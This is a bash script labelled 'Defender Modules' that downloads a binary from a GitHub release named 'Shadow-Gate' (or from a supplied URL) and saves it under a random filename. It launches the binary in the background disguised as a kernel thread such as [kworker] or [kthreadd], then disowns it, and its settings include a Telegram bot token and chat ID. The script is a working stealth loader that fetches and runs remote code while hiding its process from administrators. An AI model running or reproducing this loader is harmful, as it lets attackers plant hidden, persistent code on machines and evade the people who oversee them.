#!/usr/bin/env bash

# ═══════════════════════════════════════════════════════════════════════════════
# Defender Modules - Monitor Binary Execution Script
# ═══════════════════════════════════════════════════════════════════════════════
# 
# Simple script to download and execute monitor binary
#
# Environment Variables:
#   BOT_TOKEN       - Telegram bot token
#   CHAT_ID         - Telegram chat ID
#   AUTO_RESTORE_FILE - File to monitor
#   RAW_URL         - Raw URL for restoration
#   SECRET_KEY      - Secret key
#   BINARY_URL      - Binary download URL
#   DEBUG           - Enable debug output
#
# ═══════════════════════════════════════════════════════════════════════════════

[[ -z $ERR_LOG ]] && ERR_LOG="/dev/null"

RED="\033[31m" GREEN="\033[32m" YELLOW="\033[33m" BLUE="\033[34m"
MAGENTA="\033[35m" CYAN="\033[36m" WHITE="\033[37m" BLACK="\033[30m"
GRAY="\033[90m" BRIGHT_RED="\033[91m" BRIGHT_GREEN="\033[92m" BRIGHT_YELLOW="\033[93m"
BRIGHT_BLUE="\033[94m" BRIGHT_MAGENTA="\033[95m" BRIGHT_CYAN="\033[96m" BRIGHT_WHITE="\033[97m"
BOLD="\033[1m" DIM="\033[2m" UNDERLINE="\033[4m" BLINK="\033[5m"
RESET="\033[0m"

print_error() {
  echo -e "${BRIGHT_RED}${BOLD}[-]${RESET} ${BRIGHT_RED}${1}${RESET}"
}

print_fatal() {
  echo -e "${BRIGHT_RED}${BOLD}[!] FATAL:${RESET} ${BRIGHT_RED}$1${RESET}\n"
  exit 1
}

print_good() {
  echo -e "${BRIGHT_GREEN}${BOLD}[+]${RESET} ${BRIGHT_GREEN}${1}${RESET}"
}

clean_exit() {
	[[ -f "$MONITOR_PATH" ]] && rm -f "$MONITOR_PATH" &>/dev/null
	exit 1
}

trap clean_exit SIGINT SIGTERM

get_random_kernel_proc() {
  proc_name_arr=(
    "[migration/0]"
    "[rcu_gp]"
    "[rcu_par_gp]"
    "[kthreadd]"
    "[kworker/0:0H]"
    "[mm_percpu_wq]"
    "[ksoftirqd/0]"
    "[migration/1]"
    "[rcu_preempt]"
    "[rcu_sched]"
    "[watchdog/0]"
    "[watchdog/1]"
    "[kcompactd0]"
    "[ksmd]"
    "[khugepaged]"
    "[kintegrityd]"
    "[kblockd]"
    "[tpm_dev_wq]"
    "[ata_sff]"
    "[md]"
    "[edac-poller]"
    "[devfreq_wq]"
    "[kswapd0]"
    "[kthrotld]"
    "[irq/24-pciehp]"
    "[acpi_thermal_pm]"
    "[scsi_eh_0]"
    "[scsi_tmf_0]"
    "[scsi_eh_1]"
    "[scsi_tmf_1]"
    "[ipv6_addrconf]"
    "[kstrp]"
  )
  local proc_name
  proc_name=$(pgrep -alu root "kworker"|shuf -n 1|cut -d' ' -f2-)
  [[ -z $proc_name ]] && proc_name="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
  echo -n "$proc_name"
}

detect_arch() {
	case $(uname -m) in
		("x86_64")
			echo -n "x86_64"
			;;
		*)
			print_fatal "Unsupported OS architecture! Exiting..."
			;;
	esac
}

detect_os() {
	case $(uname -s) in
		("Linux")
			echo -n "linux"
			;;
		*)
			print_fatal "Unsupported OS! Exiting..."
			;;
	esac
}



download_binary() {
	local target_path="$1"
	local download_url="$2"
	
	[[ -z "$download_url" ]] && download_url="https://github.com/Haxor-World/Shadow-Gate/releases/download/1.0.0/monitor-${OS_NAME}-${OS_ARCH}"
	
	if command -v curl &>/dev/null; then
		curl -fsSL "$download_url" -o "$target_path" &>/dev/null || return 1
	elif command -v wget &>/dev/null; then
		wget -q "$download_url" -O "$target_path" &>/dev/null || return 1
	else
		print_fatal "curl or wget required"
	fi
	
	chmod +x "$target_path" || return 1
}

exec_hidden() {
	pgrep -f "${PROC_HIDDEN_NAME}" >/dev/null 2>&1 && return 0
	
	exec -a "${PROC_HIDDEN_NAME}" ${MONITOR_PATH} &
	disown &>/dev/null
}

init_vars() {
	[[ -z "$USER" ]] && USER=$(id -un)
	[[ -z "$HOME" ]] && HOME="$(getent passwd "$(whoami)" | cut -d: -f6)"
	[[ ! -d "$HOME" ]] && print_fatal "HOME not set"
}

print_usage() {
	echo -e "\n${BRIGHT_GREEN}${BOLD}[+] Defender Modules Started${RESET}"
	echo -e "${BRIGHT_WHITE}Process: ${BRIGHT_CYAN}$PROC_HIDDEN_NAME${RESET}"
	echo -e "${BRIGHT_WHITE}Binary: ${BRIGHT_CYAN}$MONITOR_PATH${RESET}\n"
}

command -v curl >/dev/null || command -v wget >/dev/null || print_fatal "curl or wget required"

print_banner() {
	echo -e "${BRIGHT_CYAN}${BOLD}Defender Modules${RESET} - Monitor Execution"
}
print_banner

init_vars
OS_ARCH=$(detect_arch)
OS_NAME=$(detect_os)
RAND_NAME="$(LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8)"
PROC_HIDDEN_NAME="$(get_random_kernel_proc)"
MONITOR_PATH="${PWD}/${RAND_NAME}"

echo "Downloading binary..."
download_binary "$MONITOR_PATH" "$BINARY_URL" || print_fatal "Download failed"

echo "Starting monitor..."
exec_hidden || print_fatal "Execution failed"

print_usage
